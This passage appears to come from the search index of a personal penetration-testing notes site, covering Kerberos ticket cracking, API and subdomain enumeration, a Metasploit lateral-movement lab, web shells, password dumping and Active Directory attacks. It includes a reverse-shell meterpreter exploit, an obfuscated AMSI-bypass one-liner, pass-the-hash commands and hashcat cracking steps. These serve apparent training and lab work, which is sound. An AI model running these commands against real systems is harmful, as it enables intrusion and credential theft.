\"firstName\": \"my\", \"lastName\": \"user\", \"email\": \"\", \"emailVerified\": false, \"userProfileMetadata\": { \"attributes\": [ { \"name\": \"username\", \"displayName\": \"${username}\", \"required\": true, \"readOnly\": true, \"validators\": {} }, { \"name\": \"email\", \"displayName\": \"${email}\", \"required\": true, \"readOnly\": false, \"validators\": { \"email\": { \"ignore.empty.value\": true } } }, { \"name\": \"firstName\", \"displayName\": \"${firstName}\", \"required\": true, \"readOnly\": false, \"validators\": {} }, { \"name\": \"lastName\", \"displayName\": \"${lastName}\", \"required\": true, \"readOnly\": false, \"validators\": {} } ] }, \"attributes\": { \"locale\": [ \"en\" ] } } <p>The valid email addresses identified in this process can be used to perform brute force (explained in the exploitation part of the Pentesting Keyclock Part Two). For this reason, access to the Keycloak\u2019s account page should be disabled.</p>","tags":["wordpress","keycloak"]},{"location":"kirbi2john/","title":"kirbi2john.py","text":"","tags":["pentesting","mimikatz","kerberos"]},{"location":"kirbi2john/#installation","title":"Installation","text":"<p>At: https://github.com/nidem/kerberoast/blob/master/kirbi2john.py.</p> <p>Being the following script:</p> <pre><code>#!/usr/bin/env -S python3 -tt\n# Based on the Kerberoast script from Tim Medin to extract the Kerberos tickets\n# from a kirbi file.\n# Modification to parse them into the JTR-format by Michael Kramer (SySS GmbH)\n# Copyright [2015] [Tim Medin, Michael Kramer]\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#    http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License\n\nfrom pyasn1.codec.ber import encoder, decoder\nimport glob\nimport kerberos\n\n\nif __name__ == '__main__':\n    import argparse\n    import sys\n\n    parser = argparse.ArgumentParser(description='Read Mimikatz kerberos ticket then modify it and save it in crack_file')\n    parser.add_argument('-o', dest='crack_file', metavar='crack_file', type=argparse.FileType('w'), default=sys.stdout, nargs='?',\n                    help='File to save crackable output to (default is stdout')\n    parser.add_argument('files', nargs='+', metavar='file.kirbi', type=str,\n                    help='File name to crack. Use asterisk \\'*\\' for many files.\\n Files are exported with mimikatz or from extracttgsrepfrompcap.py')\n\n    args = parser.parse_args()\n\n    enctickets = []\n\n    for path in args.files:\n        for filename in glob.glob(path):\n            et = kerberos.extract_ticket_from_kirbi(filename)\n            if et:\n                enctickets.append((et,filename))\n\n    #out=open(\"crack_file\",\"wb\")\n    for et in enctickets:\n        filename = et[1].split('/')[-1].split('\\\\')[-1].replace('.kirbi','')\n\n        out = '$krb5tgs$23$*' + filename + '*$' + et[0][:16].hex() + '$' +et[0][16:].hex() + '\\n'\n\n        args.crack_file.writelines(out)\n    sys.stderr.write('tickets written: ' + str(len(enctickets)) + '\\n')\n</code></pre>","tags":["pentesting","mimikatz","kerberos"]},{"location":"kirbi2john/#basic-usage","title":"Basic usage","text":"<pre><code>python2.7 kirbi2john.py Filename.kirbi\n</code></pre> <p>This will create a file called\u00a0<code>crack_file</code>. We then must modify the file a bit to be able to use Hashcat against the hash.</p> <pre><code>sed 's/\\$krb5tgs\\$\\(.*\\):\\(.*\\)/\\$krb5tgs\\$23\\$\\*\\1\\*\\$\\2/' crack_file &gt; ServiceName_tgs_hashcat\n</code></pre> <p>Cracking the Hash with Hashcat</p> <pre><code>hashcat -m 13100 ServiceName_tgs_hashcat /usr/share/wordlists/rockyou.txt \n</code></pre>","tags":["pentesting","mimikatz","kerberos"]},{"location":"kiterunner/","title":"Kiterunner","text":"<p>Kiterunner is an excellent tool that was developed and released by Assetnote. Kiterunner is currently the best tool available for discovering API endpoints and resources. While directory brute force tools like Gobuster/Dirbuster/ work to discover URL paths, it typically relies on standard HTTP GET requests. Kiterunner will not only use all HTTP request methods common with APIs (GET, POST, PUT, and DELETE) but also mimic common API path structures. In other words, instead of requesting GET /api/v1/user/create, Kiterunner will try POST /api/v1/user/create, mimicking a more realistic request.</p> <ol> <li> <p>First, download the dictionaries from the project. In my case I downloaded it to /usr/share/wordlists/kiterunner/:</p> </li> <li> <p>https://wordlists-cdn.assetnote.io/rawdata/kiterunner/routes-large.json.tar.gz</p> </li> <li>https://wordlists-cdn.assetnote.io/rawdata/kiterunner/routes-small.json.tar.gz</li> <li>https://wordlists-cdn.assetnote.io/data/kiterunner/routes-large.kite.tar.gz</li> <li> <p>https://wordlists-cdn.assetnote.io/data/kiterunner/routes-small.kite.tar.gz</p> </li> <li> <p>Run a quick scan of your target\u2019s URL or IP address like this:</p> </li> </ol> <pre><code>kr scan HTTP://127.0.0.1 -w ~/api/wordlists/data/kiterunner/routes-large.kite  \n</code></pre> <p>But. Note that we conducted this scan without any authorization headers, which the target API likely requires.</p> <p>To use a dictionary (and not a kite file): </p> <pre><code>kr brute &lt;target&gt; -w ~/api/wordlists/data/automated/nameofwordlist.txt\n</code></pre> <p>If you have many targets, you can save a list of line-separated targets as a text file and use that file as the target.</p> <p>One of the coolest Kiterunner features is the ability to replay requests. Thus, not only will you have an interesting result to investigate, you will also be able to dissect exactly why that request is interesting. In order to replay a request, copy the entire line of content into Kiterunner, paste it using the kb replay option, and include the wordlist you used:</p> <pre><code>kr kb replay \"GET     414 [    183,    7,   8]://192.168.50.35:8888/api/privatisations/count 0cf6841b1e7ac8badc6e237ab300a90ca873d571\" -w ~/api/wordlists/data/kiterunner/routes-large.kite\n</code></pre> <p>Running this will replay the request and provide you with the HTTP response.</p> <p>To run Kiterunner providing an authorization token as it could be \"x-access-token\", we can take the full authorization token and add it to your Kiterunner scan with the -H option:</p> <pre><code>kr scan http://IP -w /path/to/dict.txt -H 'x-access-token: eyJhGcwisdfdsfdfsdfsdfsdfdsfdsfddfdf.eyfakefakefakefaketokenfakeken._wcoooooo_kkkkkk_kkkk'\n</code></pre>"},{"location":"knockpy/","title":"knockpy - A subdomain scanner","text":"","tags":["pentesting","web pentesting","enumeration"]},{"location":"knockpy/#installation","title":"Installation","text":"<p>Repository:  https://github.com/guelfoweb/knock</p> <pre><code>git clone https://github.com/guelfoweb/knock.git\ncd knock\npip3 install -r requirements.txt\n\n# Optional: Make an alias for knockpy\nsudo chmod +x knockpy.py \nsudo ln -s /home/kali/tools/knock/knockpy.py /usr/bin/knockpy\n</code></pre>","tags":["pentesting","web pentesting","enumeration"]},{"location":"knockpy/#usage","title":"Usage","text":"<pre><code># From the tools/knock folder\npython3 knockpy.py &lt;DOMAIN&gt;\n\n# If you have made an alias, just run:\nknockpy &lt;domain&gt;\n</code></pre>","tags":["pentesting","web pentesting","enumeration"]},{"location":"lateral-movements/","title":"Lateral movements","text":"<p>Lateral movement is a technique that adversaries use, after compromising an endpoint, to extend access to other hosts or applications in an organization.</p> <p></p>","tags":["pentesting"]},{"location":"lateral-movements/#using-metasploit","title":"using metasploit","text":"<ol> <li>Get our ip</li> </ol> <pre><code>ip a\u00a0\n# 192.64.166.2\n</code></pre> <ol> <li>Get machine ip\u00a0</li> </ol> <pre><code>ping demo.ine.local\n# 192.64.166.3\n</code></pre> <ol> <li>Enumerate services in the target machine  </li> </ol> <pre><code>nmap -sV -sS -O 192.64.166.3\n# open ports: 80 and 3306.\n</code></pre> <ol> <li>Go further on port 80</li> </ol> <pre><code>nmap\u00a0\n# In the scan you will see: V-CMS-Powered by V-CMS\u00a0 and PHPSESSID: httponly flag not set\n</code></pre> <ol> <li>Launch metasploit and search for v-cms</li> </ol> <pre><code>service postgresql start\nmsfconsole -q\n</code></pre> <pre><code>search v-cms\n</code></pre> <ol> <li>Use the exploit exploit/linux/http/vcms_upload, configure it and run it</li> </ol> <pre><code>use exploit/linux/http/vcms_upload\nshow options\n</code></pre> <pre><code>set RHOST 192.64.166.3\nset TARGETURI /\nset LHOST 192.64.166.2\nset payload php/meterpreter/reverse_tcp\nrun\n</code></pre> <ol> <li>You will get a limited meterpreter. Access to the shell and print the flag</li> </ol> <pre><code>meterpreter&gt; shell\n&gt; cat /root/flag.txt\n# 4f96a3e848d233d5af337c440e50fe3d\n</code></pre> <ol> <li>Map other possible interfaces in the machine. Since ifconfig does not work, spawn the shell and try again</li> </ol> <pre><code>ifconfig\u00a0\n# does not work\n</code></pre> <pre><code>ipconfig\n# does not work\n</code></pre> <pre><code>which python\n# it\u2019s located under /bin, so we can use python to spawn the shell\n</code></pre> <pre><code>python -c 'import pty; pty.spawn(\"/bin/bash\")'\n</code></pre> <pre><code>$root@machine&gt; ifconfig\n# it tells us about another interface: 192.182.147.2\n</code></pre>","tags":["pentesting"]},{"location":"lateral-movements/#route","title":"route","text":"<ol> <li>Add tunnel from interface 192.64.166.3 (which is session 1 of meterpreter) and the discovered interface, 192.182.147.2 with the utility route:</li> </ol> <pre><code>$root@machine&gt; exit\n</code></pre> <pre><code>meterpreter&gt; run autoroute -s 192.182.147.0 -n 255.255.255.0\n# you can also add a route out of the meterpreter. In that case you need to specify the meterpreter session: route add 192.182.147.0 .0 255.255.255.0 1\n</code></pre> <ol> <li>Background the meterpreter session and check if the route is added successfully to the metasploit's routing table.</li> </ol> <pre><code>meterpreter&gt; background\nmsf&gt; route print\n</code></pre> <ol> <li>Run auxiliary TCP port scanning module to discover any available hosts (From IP .3 to .10). And, if any of ports 80, 8080, 445, 21 and 22 are open on those hosts.</li> </ol> <pre><code>msf&gt; use auxiliary/scanner/portscan/tcp\n\nmsf\u00a0 auxiliary/scanner/portscan/tcp &gt; set PORTS 80, 8080, 445, 21, 22\n\nmsf\u00a0 auxiliary/scanner/portscan/tcp &gt; set RHOSTS 192.69.228.3-10\n\nmsf\u00a0 auxiliary/scanner/portscan/tcp &gt; exploit\n# Give us ports 21 and 22 open at 192.182.147.3\n</code></pre>","tags":["pentesting"]},{"location":"lateral-movements/#portfwd","title":"portfwd","text":"<ol> <li>In order to reach the discovered target, we need to fordward remote machine port to the local machine port. We want to target port 21 of that machine so we will forward remote port 21 to the local port 1234. This is done with the utility portfwd from meterpreter</li> </ol> <pre><code>msf\u00a0 auxiliary/scanner/portscan/tcp &gt; sessions -i 1\n\nmeterpreter&gt; portfwd\n# Tell you  there is none configured\n\nmeterpreter&gt; portfwd add -l 1234 -p 21 -r 192.182.147.3\n# -l: local port \n# -p 21 The port we are targeting in our attack \n# -r the remote host\n\nmeterpreter&gt; portfwd list\n# It tells the active Port Forwards. Now, scan the local port using Nmap\n</code></pre> <ol> <li>Run nmap on the forwarded local port to identify the service name</li> </ol> <pre><code>meterpreter&gt; background\n\nmsf&gt; nmap -sS -sV -p 1234 localhost\n# It tells you the ftp version: vsftpd 2.0.8 or later\n</code></pre> <ol> <li>Search for vsftpd exploit module and exploit the target host using vsftpd backdoor exploit module.</li> </ol> <pre><code>msf &gt; search vsftpd\u00a0\nmsf&gt; use exploit/unix/ftp/vsftpd_234_backdoor\nmsf exploit/unix/ftp/vsftpd_234_backdoor&gt; \u00a0 set RHOSTS 192.69.228.3\nmsf exploit/unix/ftp/vsftpd_234_backdoor&gt; exploit\n\n# Sometimes, the exploit fails the first time. If that happens then please run the exploit again.\n\n$&gt; id\n# you are root.\n</code></pre> <ol> <li>Print the flag</li> </ol> <pre><code>$&gt; cat /root/flag.txt\n# 58c7c29a8ab5e7c4c06256b954947f9a\n</code></pre>","tags":["pentesting"]},{"location":"laudanum/","title":"Laudanum: Injectable Web Exploit Code","text":"<p>Laudanum is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell, run commands on the victim host right from the browser, and more. The repo includes injectable files for many different web application languages to include asp, aspx, jsp, php, and more. </p>","tags":["pentesting","web pentesting","web shells"]},{"location":"laudanum/#installation","title":"Installation","text":"<p>Pre-built in Kali.</p> <p>Download from github repo: https://github.com/jbarcia/Web-Shells/tree/master/laudanum.</p>","tags":["pentesting","web pentesting","web shells"]},{"location":"laudanum/#basic-usage","title":"Basic usage","text":"<p>The Laudanum files can be found in the /usr/share/webshells/laudanum directory. For most of the files within Laudanum, you can copy them as-is and place them where you need them on the victim to run. For specific files such as the shells, you must edit the file first to insert your attacking host IP address</p> <pre><code>locate laudanum\n</code></pre> <p>Fist step: Copy the file you want to use from laudanum repo to where you want to use it from:</p> <pre><code>cp /usr/share/laudanum/aspx/shell.aspx /your/path/laudanum.aspx\n# In this case I'm selecting an aspx shell. There are other types.\n</code></pre> <p>Second step: Modify the shell to use. Add to the whitelisting  rule your ip.</p> <p></p> <p>Third step: Upload the file to the web server.</p> <p>Fourth step: Once uploaded, go to http://webserver//file/laudanum.aspx which is your uploaded file. You will see something like:</p> <p></p> <p>Ready to use!</p>","tags":["pentesting","web pentesting","web shells"]},{"location":"lazagne/","title":"Lazagne","text":"<p>The\u00a0LaZagne project\u00a0is an open source application used to\u00a0retrieve lots of passwords\u00a0stored on a local computer. Each software stores its passwords using different techniques (plaintext, APIs, custom algorithms, databases, etc.). This tool has been developed for the purpose of finding these passwords for the most commonly-used software.</p>","tags":["pentesting","web pentesting","passwords"]},{"location":"lazagne/#installation","title":"Installation","text":"<p>Download from github repo: https://github.com/AlessandroZ/LaZagne.</p> <p>Download a standalone copy from https://github.com/AlessandroZ/LaZagne/releases/.</p>","tags":["pentesting","web pentesting","passwords"]},{"location":"lazagne/#basic-usage","title":"Basic usage","text":"<p>Once Lazagne.exe is on the target, we can open command prompt or PowerShell, navigate to the directory the file was uploaded to, and execute the following command:</p> <pre><code>C:\\Users\\username\\Desktop&gt; start lazagne.exe all\n# -vv: to study what it is doing in the background.\n</code></pre>","tags":["pentesting","web pentesting","passwords"]},{"location":"ldap/","title":"LDAP - Active directory","text":"<p>Active Directory (AD) is a directory service for Windows network environments.  Lightweight Directory Access Protocol (LDAP) is an integral part of Active Directory (AD). The\u00a0Lightweight Directory Access Protocol\u00a0(LDAP)\u00a0is an open, vendor-neutral, industry standard\u00a0application protocol for accessing and maintaining distributed\u00a0directory information services over a TCP/IP\u00a0Internet Protocol\u00a0(IP) network.</p> <p>And what about LDAP? See here.</p>","tags":["active","directory","ldap","windows"]},{"location":"ldap/#tools","title":"Tools","text":"","tags":["active","directory","ldap","windows"]},{"location":"ldap/#xfreerdp","title":"xfreerdp","text":"<p>See cheat sheet.</p> <pre><code>xfreerdp /v:$ip /u:htb-student /p:&lt;password&gt; /cert-ignore\n</code></pre>","tags":["active","directory","ldap","windows"]},{"location":"ldap/#rsat-remote-server-administration-tools","title":"RSAT (Remote Server Administration Tools)","text":"<p>RSAT (Remote Server Administration Tools) cheat sheet:</p> <pre><code># Check if RSAT tools are installed\nGet-WindowsCapability -Name RSAT* -Online \\| Select-Object -Property Name, State\n\n# Install all RSAT tools\nGet-WindowsCapability -Name RSAT* -Online \\| Add-WindowsCapability \u2013Online\n\n# Install a specific RSAT tool, for instance Rsat.ActiveDirectory.DS-LDS.Tools \nAdd-WindowsCapability -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0  \u2013Online\n</code></pre> <p>Once installed, all of the tools will be available under: Control Panel&gt; All Control Panel Items &gt;Administrative Tools.</p>","tags":["active","directory","ldap","windows"]},{"location":"ldap/#bypassing","title":"Bypassing","text":"","tags":["active","directory","ldap","windows"]},{"location":"ldap/#bypass-execution-policy","title":"Bypass Execution Policy","text":"<pre><code>powershell -ep bypass\n</code></pre>","tags":["active","directory","ldap","windows"]},{"location":"ldap/#bypass-amsi","title":"Bypass AMSI","text":"<pre><code>**S`eT-It`em ( 'V'+'aR' +\u00a0 'IA' + ('blE:1'+'q2')\u00a0 + ('uZ'+'x')\u00a0 ) ( [TYpE](\u00a0 \"{1}{0}\"-F'F','rE'\u00a0 ) )\u00a0 ;\u00a0 \u00a0 (\u00a0 \u00a0 Get-varI`A`BLE\u00a0 ( ('1Q'+'2U')\u00a0 +'zX'\u00a0 )\u00a0 -VaL\u00a0 ).\"A`ss`Embly\".\"GET`TY`Pe\"((\u00a0 \"{6}{3}{1}{4}{2}{0}{5}\" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')\u00a0 ) ).\"g`etf`iElD\"(\u00a0 ( \"{0}{2}{1}\" -f('a'+'msi'),'d',('I'+'nitF'+'aile')\u00a0 ),(\u00a0 \"{2}{4}{0}{1}{3}\" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'\u00a0 )).\"sE`T`VaLUE\"(\u00a0 ${n`ULl},${t`RuE} )**\n</code></pre>","tags":["active","directory","ldap","windows"]},{"location":"ldap/#run-a-utility-as-another-user","title":"Run a utility as another user","text":"<pre><code># Run a utility as another user\nrunas /netonly /user:htb.local\\jackie.may powershell\n\n# Run an utility as another user with rubeus. Passing clear text credentials\nrubeus.exe asktgt /user:jackie.may /domain:htb.local /dc:10.10.110.100 /rc4:ad11e823e1638def97afa7cb08156a94\n\n# Run an utility as another user with mimikatz.exe. Passing clear text credentials\nmimikatz.exe sekurlsa::pth /domain:htb.local /user:jackie.may /rc4:ad11e823e1638def97afa7cb08156a94\n</code></pre>","tags":["active","directory","ldap","windows"]},{"location":"ldap/#enumeration","title":"Enumeration","text":"<p>Basic reconnaissance:\u00a0Who I am, where I am and what permissions I have.</p> <pre><code>whoami\nhostname\nnet localgroup administrators\n\n# View a user's current rights\nwhoami /priv\n</code></pre> <p>A basic AD user account with no added privileges can be used to enumerate the majority of objects contained within AD, including but not limited to:</p>","tags":["active","directory","ldap","windows"]},{"location":"ldap/#1-domain-computers","title":"1. Domain Computers","text":"<pre><code># Use ADSI to search for all computers\n([adsisearcher]\"(&amp;(objectClass=Computer))\").FindAll()\n\n#Query for installed software\nget-ciminstance win32_product \\| fl\n</code></pre>","tags":["active","directory","ldap","windows"]},{"location":"ldap/#2-domain-users","title":"2. Domain Users","text":"<p>Two ways. First, if we compromise a domain-joined system (or a client has you perform an AD assessment from one of their workstations) we can leverage RSAT to enumerate AD (Active Directory Users and Computers and ADSI Edit modules). Second, we can enumerate the domain from a non-domain joined host (provided that it is in a subnet that communicates with a domain controller) by launching any RSAT snap-ins using \"runas\" from the command line.</p> <pre><code># Gets one or more Active Directory users.\nGet-ADUser\n\n# List disabled users\nGet-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=2)' | select name\n\n# Count all users in an OU\n(Get-ADUser -SearchBase \"OU=Employees,DC=INLANEFREIGHT,DC=LOCAL\" -Filter *).count\n</code></pre> <p>We can also open the MMC Console from a non-domain joined computer using the following command syntax (See here how to deal with following steps the MMC interface):</p> <pre><code>runas /netonly /user:Domain_Name\\Domain_USER mmc\n</code></pre> <p>Also, NT Authority/System is a LocalSystem account built-in in Windows operating systems, used by the service control manager. Having SYSTEM-level access within a domain environment is nearly equivalent to having a domain user account. The only real limitation is not being able to perform cross-trust Kerberos attacks such as Kerberoasting ( See techniques to gain SYSTEM-level access on a host).</p> <p>Enumerating with powerview.ps1</p>","tags":["active","directory","ldap","windows"]},{"location":"ldap/#3-domain-group-information","title":"3. Domain Group Information","text":"<pre><code># Get all administrative groups \nGet-ADGroup -Filter \"adminCount -eq 1\" \\| select Name\n\n# LDAP query to return all AD groups\nGet-ADObject -LDAPFilter '(objectClass=group)' \\| select cn\n\n# Get AD groups using WMI \nGet-WmiObject -Class win32_group -Filter \"Domain='INLANEFREIGHT'\"\n\n# Get information about an specific AD group\nGet-ADGroup -Identity \"&lt;GROUP NAME&gt;\" -Properties *\n</code></pre> <p>Domain Groups of interest:</p> <pre><code>Get-ADGroup -Identity \"&lt;GROUP NAME&gt;\" -Properties *\n</code></pre> <p>These are some groups with special permissions that, if missconfigured, might be exploited:</p> <pre><code># Schema Admins | The Schema Admins group is a high privileged group in a forest root domain. The membership of this group must be limited. This group is use to modify the schema of forest. Additional accounts must only be added when changes to the schema are necessary and then must be removed. By default, the Administrator account is a member of this group. Because this group has significant power in the forest, add users with caution. Members can modify the Active Directory schema structure and can backdoor any to-be-created Group/GPO by adding a compromised account to the default object ACL.\nGet-ADGroup -Identity \"Schema Admins\" -Properties *\n\n# Default Administrators | Domain Admins and Enterprise Admins \"super\" groups. A built-in group . Grants complete and unrestricted access to the computer, or if the computer is promoted to a domain controller, members have unrestricted access to the domain. This group cannot be renamed, deleted, or moved. This built-in group controls access to all the domain controllers in its domain, and it can change the membership of all administrative groups. Membership can be modified by members of the following groups: the default service Administrators, Domain Admins in the domain, or Enterprise Admins.\nGet-ADGroup -Identity \"Administrators\" -Properties *\n\n# Server Operators | A built-in group that exists only on domain controllers. By default, the group has no members. Server Operators can log on to a server interactively; create and delete network shares; start and stop services; back up and restore files; format the hard disk of the computer; and shut down the computer. Members can modify services, access SMB shares, and backup files. \nGet-ADGroup -Identity \"Server Operators\" -Properties *\n\n# Backup Operators | A built-in group. By default, the group has no members. Backup Operators can back up and restore all files on a computer, regardless of the permissions that protect those files. Backup Operators also can log on to the computer and shut it down. Members are allowed to log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database, read the registry remotely, and access the file system on the DC via SMB. This group is sometimes added to the local Backup Operators group on non-DCs. \nGet-ADGroup -Identity \"Backup Operators\" -Properties *\n\n# Print Operators | A built-in group that exists only on domain controllers. By default, the only member is the Domain Users group. Print Operators can manage printers and document queues. They can also manage Active Directory printer objects in the domain. Members of this group can locally sign in to and shut down domain controllers in the domain. Because members of this group can load and unload device drivers on all domain controllers in the domain, add users with caution. This group cannot be renamed, deleted, or moved. Members are allowed to logon to DCs locally and \"trick\" Windows into loading a malicious driver. \nGet-ADGroup -Identity \"Print Operators\" -Properties *\n\n# Hyper-V Administrators | Members of the Hyper-V Administrators group have complete and unrestricted access to all the features in Hyper-V. Adding members to this group helps reduce the number of members required in the Administrators group, and further separates access. If there are virtual DCs, any virtualization admins, such as members of Hyper-V Administrators, should be considered Domain Admins.\nGet-ADGroup -Identity \"Hyper-V Administrators\" -Properties *\n\n# Account Operators | Grants limited account creation privileges to a user. Members of this group can create and modify most types of accounts, including those of users, local groups, and global groups, and members can log in locally to domain controllers. Members of the Account Operators group cannot manage the Administrator user account, the user accounts of administrators, or the Administrators, Server Operators, Account Operators, Backup Operators, or Print Operators groups. Members of this group cannot modify user rights. Members can modify non-protected accounts and groups in the domain. \nGet-ADGroup -Identity \"Account Operators\" -Properties *\n\n# Remote Desktop Users | The Remote Desktop Users group on an RD Session Host server is used to grant users and groups permissions to remotely connect to an RD Session Host server. This group cannot be renamed, deleted, or moved. It appears as a SID until the domain controller is made the primary domain controller and it holds the operations master role (also known as flexible single master operations or FSMO). Members are not given any useful permissions by default but are often granted additional rights such as Allow Login Through Remote Desktop Services and can move laterally using the RDP protocol.\nGet-ADGroup -Identity \"Remote Desktop Users\" -Properties *\n\n# Remote Management Users | Members of the Remote Management Users group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user. The Remote Management Users group is generally used to allow users to manage servers through the Server Manager console, whereas the WinRMRemoteWMIUsers_ group is allows remotely running Windows PowerShell commands. Members are allowed to logon to DCs with PSRemoting (This group is sometimes added to the local remote management group on non-DCs). \nGet-ADGroup -Identity \"Remote Management Users\" -Properties *\n\n# Group Policy Creator Owners | A global group that is authorized to create new Group Policy objects in Active Directory. By default, the only member of the group is Administrator. The default owner of a new Group Policy object is usually the user who created it. If the user is a member of Administrators or Domain Admins, all objects that are created by the user are owned by the group. Owners have full control of the objects they own. Members can create new GPOs but would need to be delegated additional permissions to link GPOs to a container such as a domain or OU.\nGet-ADGroup -Identity \"Group Policy Creator Owners\" -Properties *\n\n# DNSAdmins | Members of this group have administrative access to the DNS Server service. The default permissions are as follows: Allow: Read, Write, Create All Child objects, Delete Child objects, Special Permissions. This group has no default members. Members have the ability to load a DLL on a DC but do not have the necessary permissions to restart the DNS server. They can load a malicious DLL and wait for a reboot as a persistence mechanism. Loading a DLL will often result in the service crashing. A more reliable way to exploit this group is to create a WPAD record.\nGet-ADGroup -Identity \"DNSAdmins\" -Properties *\n</code></pre>","tags":["active","directory","ldap","windows"]},{"location":"ldap/#4-default-domain-policy","title":"4. Default Domain Policy","text":"","tags":["active","directory","ldap","windows"]},{"location":"ldap/#5-domain-functional-levels","title":"5. Domain Functional Levels","text":"<pre><code># Get hostnames with the word \"SQL\" in their hostname \nGet-ADComputer  -Filter \"DNSHostName -like 'SQL*'\"` \n</code></pre> <p>6. Password Policy</p> <p>7. Group Policy Objects (GPOs)</p> <p>8. Kerberos Delegation</p> <pre><code># Find admin users that don't require Kerberos Pre-Auth\nGet-ADUser -Filter {adminCount -eq '1' -and DoesNotRequirePreAuth -eq 'True'}\n</code></pre> <p>9. Domain Trusts</p> <p>10. Access Control Lists (ACLs)</p> <pre><code>#  Enumerate UAC values for admin users\nGet-ADUser -Filter {adminCount -gt 0} -Properties admincount,useraccountcontrol \n</code></pre> <p>11. Remote access rights</p> <p>Active Directory can be easily misconfigurable. These are common attacks:</p> <ul> <li>Kerberoasting / ASREPRoasting</li> <li>NTLM Relaying</li> <li>Network traffic poisoning</li> <li>Password spraying</li> <li>Kerberos delegation abuse</li> <li>Domain trust abuse</li> <li>Credential theft</li> <li>Object control</li> </ul>","tags":["active","directory","ldap","windows"]},{"location":"ldap/#cheat-sheet-so-far","title":"Cheat sheet so far","text":"Command Description <code>xfreerdp /v:$ip /u:htb-student /p:&lt;password&gt;</code> RDP to lab target <code>Get-ADGroup -Identity \"&lt;GROUP NAME\"&gt; -Properties *</code> Get information about an AD group <code>whoami /priv</code> View a user's current rights <code>Get-WindowsCapability -Name RSAT* -Online \\| Select-Object -Property Name, State</code> Check if RSAT tools are installed <code>Get-WindowsCapability -Name RSAT* -Online \\| Add-WindowsCapability \u2013Online</code> Install all RSAT tools <code>runas /netonly /user:htb.local\\jackie.may powershell</code> Run a utility as another user <code>Get-ADObject -LDAPFilter '(objectClass=group)' \\| select cn</code> LDAP query to return all AD groups <code>Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=2)' \\| select name</code> List disabled users <code>(Get-ADUser -SearchBase \"OU=Employees,DC=INLANEFREIGHT,DC=LOCAL\" -Filter *).count</code> Count all users in an OU <code>get-ciminstance win32_product \\| fl</code> Query for installed software <code>Get-ADComputer  -Filter \"DNSHostName -like 'SQL*'\"</code> Get hostnames with the word \"SQL\" in their hostname <code>Get-ADGroup -Filter \"adminCount -eq 1\" \\| select Name</code> Get all administrative groups <code>Get-ADUser -Filter {adminCount -eq '1' -and DoesNotRequirePreAuth -eq 'True'}</code> Find admin users that don't require Kerberos Pre-Auth <code>Get-ADUser -Filter {adminCount -gt 0} -Properties admincount,useraccountcontrol</code> Enumerate UAC values for admin users <code>Get-WmiObject -Class win32_group -Filter \"Domain='INLANEFREIGHT'\"</code> Get AD groups using WMI <code>([adsisearcher]\"(&amp;(objectClass=Computer))\").FindAll()</code> Use ADSI to search for all computers","tags":["active","directory","ldap","windows"]},{"location":"ldap/#acronyms","title":"Acronyms","text":"<p>ADSI</p> <p>Active Directory Service Interfaces (ADSI) is a set of COM interfaces used to access the features of directory services from different network providers. ADSI is used in a distributed computing environment to present a single set of directory service interfaces for managing network resources. Administrators and developers can use ADSI services to enumerate and manage the resources in a directory service, no matter which network environment contains the resource. ADSI enables common administrative tasks, such as adding new users, managing printers, and locating resources in a distributed computing environment.</p> <p>CIM The Common Information Model (CIM) is the Distributed Management Task Force (DMTF) standard [DSP0004] for describing the structure and behavior of managed resources such as storage, network, or software components. One way to describe CIM is to say that it allows multiple parties to exchange management information about these managed elements. However, this falls short of fully capturing CIM's ability not only to describe these managed elements and the management information, but also to actively control and manage them. By using a common model of information, management software can be written once and work with many implementations of the common model without complex and costly conversion operations or loss of information.</p> <p>DIT Directory Information Tree. </p> <p>MMC You use Microsoft Management Console (MMC) to create, save and open administrative tools, called consoles, which manage the hardware, software, and network components of your Microsoft Windows operating system.</p> <p>OU</p> <p>What is an organizational unit in Active Directory? An OU is a container within a Microsoft Windows Active Directory (AD) domain that can hold users, groups and computers. It is the smallest unit to which an administrator can assign Group Policy settings or account permissions.</p> <p>RSAT</p> <p>The Remote Server Administration Tools (RSAT) have been part of Windows since the days of Windows 2000. RSAT allows systems administrators to remotely manage Windows Server roles and features from a workstation running Windows 10, Windows 8.1, Windows 7, or Windows Vista. RSAT can only be installed on Professional or Enterprise editions of Windows.</p> <p>SID</p> <p>In the context of the Microsoft Windows NT line of operating systems, a Security Identifier is a unique, immutable identifier of a user, user group, or other security principal. </p> <p>SPN</p> <p>A service principal name (SPN) is\u00a0a unique identifier of a service instance. Kerberos authentication uses SPNs to associate a service instance with a service sign-in account. Doing so allows a client application to request service authentication for an account even if the client doesn't have the account name.</p> <p>UAC</p> <p>User Account Control (UAC) is a fundamental component of Microsoft's overall security vision. UAC helps mitigate the impact of malware.</p>","tags":["active","directory","ldap","windows"]},{"location":"ldap/#attacking-active-directory","title":"Attacking Active Directory","text":"<p>Once a Windows system is joined to a domain, it will no longer default to referencing the SAM database to validate logon requests. That domain-joined system will now send all authentication requests to be validated by the domain controller before allowing a user to log on. </p> <p>If needed, use tools like username Anarchy to create list of usernames.</p>","tags":["active","directory","ldap","windows"]},{"location":"ldap/#1-dumping-ntdsdit","title":"1. Dumping ntds.dit","text":"","tags":["active","directory","ldap","windows"]},{"location":"ldap/#dumping-ntdsdit-locally","title":"Dumping ntds.dit locally","text":"<p><code>NT Directory Services</code> (<code>NTDS</code>) is the directory service used with AD to find &amp; organize network resources. Recall that <code>NTDS.dit</code> file is stored at <code>%systemroot$/ntds</code> on the domain controllers in a forest.</p> <p>The <code>.dit</code> stands for directory information tree. This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information. If this file can be captured, we could potentially compromise every account on the domain</p> <pre><code># Connect 